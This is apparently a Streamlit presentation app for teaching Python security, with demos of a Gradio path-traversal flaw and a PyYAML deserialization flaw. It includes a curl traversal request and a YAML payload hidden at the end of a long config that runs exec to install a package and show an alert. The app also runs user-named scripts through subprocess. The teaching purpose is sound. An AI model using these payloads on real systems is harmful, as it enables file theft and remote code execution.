import streamlit as st
import subprocess
from streamlit_ace import st_ace

tab1, tab2, tab3, tab4, tab5, tab6  = st.tabs(["vulnerabilities", "exploits", "path traversal", "code injection", "typosquatting", "attacking"])
# taken from edx:
#A vulnerability is a flaw in a system's design,
#implementation or operation,
#that can be exploited to violate
#the system's security policy.

# bugs:
#That's well and good, except bugs are usually
#perceived to be implementation mistakes.
#In fact, systems can and do have bugs
#in the way they're designed and used as well.

# exploits
#An exploit leverages a vulnerability
#to violate a system's security policy.
#So while a vulnerability is the actual
#problem with the system,
#an exploit is what takes advantage
#of that problem, usually with malicious intent.

with tab1:
    st.write("### structure of chapter:")
    st.write("""
             # visualisation breakage in thinking process, and breackage in coding process (system design vs implementation)
             # continue exploit -> search and using breakacge in thinking
             what are vulnerabilities vs bugs 
    """)

with tab2:
        st.write("""
             what are exploits 
             3. Python specific: \n
             What are the threats and what can I do?
             - list of threats to adress
             1. path traversal
             2. code injection
             ...
             - how can you go about it """)


with tab3:
    col1, col2 = st.columns(2)

    with col1:
        st.write("""
         CVE-2023-51449\n
        """)
        code_text = """ 
             import gradio as gr

             demo_img = "./pages/scripts/assets/skull-and-crossbones.png"
             
             def show_image(img):
                 return img
             
             app = gr.Interface(
                 fn=show_image,
                 inputs=gr.Image(label="Input Image Component", value=demo_img, height=800, width=800),
                 outputs=[gr.Image(label="Output Image Component", height=400, width=400, image_mode="L")]
             )
             
             app.launch(share=True)"""
        st.code(code_text)

        def run_py_script(script_name):

             command = ["python", '-u', script_name]
             process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
             while process.poll() is None:
                line = process.stdout.readline()
                if not line:
                    continue
                st.write(line.strip())
    
        script_name = st.text_input('Enter the name of the python script:')
    
        
        # When the user submits the script name, run the shell script
        if st.button('Run'):
            run_py_script(script_name)

    with col2:
        
        dummy_cmd = "curl --list-only --path-as-is https://xxxxxx..xx.gradio.live/file=/tmp/gradio/xxxxx/../../../path/to/asset.jpeg --output /path/to/your/copy.jpeg"
        st.write(dummy_cmd)
        content = st_ace(language='css')

        st.image("./pages/scripts/assets/gradio_demo.jpg")

         
##
##"""
##Storyline of gradio app vulnerability -> show code -> run code -> print console output to the presentation (but modified) 
##-> send roman modified version and roman seemlingly inserts the modified version but actually inserts the real version 
##(if quick might be enough if it is the real version)
##steals the picture and then shows it on his PC -> large emoji or urlaubsbild
##
##idea to display -> show two consoles next to each other gradio app in python + output and linux terminal with curl command
##-> out put = image with title stolen -> roman zeigt seins hoch in die camera
##"""


with tab4:
    col1, col2 = st.columns(2)

    with col1:
        st.write("""
         CVE-2020-14343\n
        """)
        code_text = """ 
            import yaml
            from yaml import FullLoader
            from flask import Flask

            def load_config(filename):
                with open(filename, 'r') as file:
                    config_data = yaml.load(file, Loader=FullLoader)
                return config_data

            def start_server(config):
                app = Flask(__name__)

                # Apply server configuration
                app.run(host=config['server']['host'],
                        port=config['server']['port'],
                        debug=config['server']['debug'])

            config_data = load_config('totally_safe_file.yaml')
            start_server(config_data)"""
        st.code(code_text)
    
        script_name = st.text_input('Enter the name of the python script:', key="roman_ace")
    
        
        # When the user submits the script name, run the shell script
        if st.button('Run', key="roman_ace_button"):
            run_py_script(script_name)

    with col2:
        hide_yaml = st.checkbox("Hide yaml Content")
        if not hide_yaml:
            st.code("""server:
    host: 0.0.0.0
    port: 8080
    debug: false
    ssl:
        enabled: true
        certificate: /path/to/certificate.pem
        key: /path/to/private_key.pem
    logging:
        level: INFO
        format: '%(asctime)s - %(levelname)s - %(message)s'
        file: /path/to/server.log
    middleware:
        - name: compression
        enabled: true
        level: 6
        - name: rate_limiting
        enabled: true
        limit: 100
        window_size: 60
        key_func: 'lambda request: request.remote_addr'
        - name: authentication
        enabled: true
        secret_key: 'your_secret_key_here'
        - name: request_logging
        enabled: true
        format: '%(asctime)s - %(remote_addr)s - %(method)s - %(url)s - %(status_code)s - %(response_length)s'
        - name: csrf_protection
        enabled: true
        secret_key: 'your_csrf_secret_key_here'
        - name: cache_control
        enabled: true
        directives:
            - public
            - max-age=3600
            - s-maxage=3600
    database:
    host: localhost
    port: 5432
    username: user
    password: password
    pool_size: 100
    timeout: 30
    connection_limit: 1000
    schema: public
    replication:
        enabled: true
        master: master_db
        slaves:
        - slave1_db
        - slave2_db
    indexes:
        - name: index1
        fields:
            - field1
            - field2
        unique: true
        - name: index2
        fields:
            - field3
    migrations:
        directory: /path/to/migrations
        auto_apply: true
        table: schema_migrations
        lock_timeout: 10
        retries: 3
        retry_delay: 5
        migration_jobs:
        - name: job1
            type: manual
            description: 'Perform manual migration step 1'
        - name: job2
            type: automatic
            description: 'Automatically apply schema changes'
        - name: job3
            type: automatic
            description: 'Run data migration scripts'
    cache:
        enabled: true
        type: redis
        url: redis://localhost:6379/0
        expiration: 3600
        size_limit: 1000
        eviction_strategy: LRU
        compression: true
        compression_threshold: 1000
        cache_regions:
        - name: user_data
            expiration: 86400
        - name: product_data
            expiration: 3600
        - name: session_data
            expiration: 1800
        - name: static_files
            expiration: 604800
        - name: search_results
            expiration: 300
        - name: authentication_tokens
            expiration: 3600
        - name: analytics_data
            expiration: 86400
        - name: billing_data
            expiration: 259200
        - name: notification_data
            expiration: 3600
        - name: image_cache
            expiration: 2592000
        - name: video_cache
            expiration: 2592000
        - name: audio_cache
            expiration: 2592000
        - name: document_cache
            expiration: 2592000
        - name: temp_data
            expiration: 300
        - name: metadata_cache
            expiration: 86400
    queues:
        - name: email_queue
        type: rabbitmq
        url: amqp://guest:guest@localhost:5672/
        prefetch_count: 10
        durable: true
        auto_delete: false
        retries: 3
        retry_delay: 5
        max_retry_delay: 60
        retry_exponential_backoff: true
        retry_backoff_factor: 2.0
        dead_letter_exchange: dead_letter_exchange
        dead_letter_routing_key: email_queue_dead_letter
        - name: processing_queue
        type: redis
        url: redis://localhost:6379/1
        concurrency: 5
        batch_size: 50
        timeout: 300
        retry_policy:
            max_retries: 3
            delay: 5
            backoff_factor: 2.0
            jitter: true
            jitter_factor: 0.1
            exponential_backoff: false
        - name: notification_queue
        type: kafka
        url: kafka://localhost:9092/
        topic: notification_topic
        group_id: notification_group
        auto_commit: true
        auto_offset_reset: latest
        max_poll_records: 100
        enable_auto_commit: true
        commit_interval_ms: 1000
        heartbeat_interval_ms: 3000
        session_timeout_ms: 10000
        max_poll_interval_ms: 60000
        request_timeout_ms: 30000
        security_protocol: SASL_SSL
        ssl_cafile: /path/to/ca.crt
        sasl_mechanism: PLAIN
        sasl_plain_username: username
        sasl_plain_password: password
        enable_idempotence: true
        message_timeout_ms: 10000
        max_in_flight_requests_per_connection: 5
        retries: 5
        retry_backoff_ms: 100
        delivery_timeout_ms: 120000
        linger_ms: 5
        request_max_bytes: 1048576
        message_send_max_retries: 3
        reconnect_backoff_ms: 100
        max_block_ms: 60000
        max_request_size: 1048576
        metadata_max_age_ms: 300000
        receive_buffer_bytes: 32768
        send_buffer_bytes: 131072
        connections_max_idle_ms: 540000
        acks: all
        compression_type: snappy
        batch_size: 16384
        linger_ms: 100
        max_request_size: 1048576
        buffer_memory: 33554432
        max_block_ms: 60000
        max_in_flight_requests_per_connection: 5
        retries: 5
        retry_backoff_ms: 100
        request_timeout_ms: 30000
        reconnect_backoff_ms: 100
        receive_buffer_bytes: 32768
        send_buffer_bytes: 131072
        compression_type: none
        batch_size: 16384
        linger_ms: 100
        request_timeout_ms: 30000
        max_request_size: 1048576
        retry_backoff_ms: 100
        reconnect_backoff_ms: 100
        receive_buffer_bytes: 32768
        send_buffer_bytes: 131072
        max_block_ms: 60000
        request_timeout_ms: 30000
        reconnect_backoff_ms: 100
        retry_backoff_ms: 100
        receive_buffer_bytes: 32768
        send_buffer_bytes: 131072
        - !!python/object/new:tuple 
        - !!python/object/new:map 
            - !!python/name:exec
            - [ import subprocess,
                import sys,
                'subprocess.check_call([sys.executable, "-m", "pip", "install",  "-q", "PyMsgBox"])',
                import pymsgbox,
                'pymsgbox.alert("Congratulation", "You executed random Code")']""", language="yaml")

with tab5:
     st.write(""" 
              Maby next/Separate Chapter? \n
              promised multi-stage-attack details -> \n
              look deeper into the case of typosquatting -> explain the case \n
                       """)

with tab6:
     st.write(""" 
              -> deeper into type of attacks at the end of the session for now: \n
              most common type of attack with success and recent development more of them (check source) \n
              multi-stage-attack -> multi step approach mainly looking for information trying to get into the system by a low level vulnerable entry point
              to maintain and widen acces to the internal system gaining acces to privileges in the system to get acces to data they can use for profit
              again in detail later on the single steps and how to counter them individually \n
              -> shows attackers leverages many vulnerabilities -> goal is to know how to minimize entrypoints or wholes thet can be used by others \n
                """)
